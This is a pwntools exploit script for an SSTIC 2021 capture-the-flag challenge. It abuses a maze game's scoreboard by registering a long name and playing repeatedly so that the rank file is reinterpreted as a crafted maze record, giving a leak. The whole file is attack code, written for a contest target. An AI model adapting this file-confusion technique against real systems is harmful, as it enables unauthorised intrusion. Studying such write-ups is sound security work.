from pwn import *

local = False
if local:
    s = remote('172.16.113.128', 4444)
else:
    # create a new sandbox and save the UID for later scripts
    s = remote('challenge2021.sstic.org', 4577)
    s.sendline()
    s.recvuntil('Your UID is ')
    uid = s.recvuntil(' and ', drop=True)
    with open('uid.txt', 'wb') as outf:
        outf.write(uid)
    log.info("UID: %s", uid.decode())


_menucount = 1
def menu(n):
    global _menucount
    _menucount += 1
    s.sendline(str(n))

def menusync():
    global _menucount
    for i in range(_menucount):
        s.recvuntil('8. Exit\r\n')
    _menucount = 0

def register(name):
    menu(1)
    s.sendline(name)

def load(x):
    menu(3)
    s.sendline(str(x))

def remove(x):
    menu(5)
    s.sendline(str(x))

def scoreboard():
    menusync()
    menu(6)
    return s.recvuntil('\r\nMenu\r\n\r\n', drop=True)

# maze type 0, w=h=0 (from score)
register(b'A' * 0x7f)

menu(2) # create
s.sendline('1') # classic
s.sendline('c') # custom
s.sendline('3') # w = h = 3
s.sendline('3')
s.sendline('y') # save
s.sendline('leak') # save

# insert our name into the scoreboard
# rank file: [num_ranks=80] [name_length=7f] [name=414141...41] [score=0000000000000000] ...
# will be interpreted as the maze [creator_name_length=80] [creator_name=7f41414141...41] [maze_type=00] [width=00] [height=00]
for i in range(0x80):
    if i % 0x20 == 0:
        menusync()
    menu(4) # play
    # move right once
    s.sendline('d')

s.interactive()
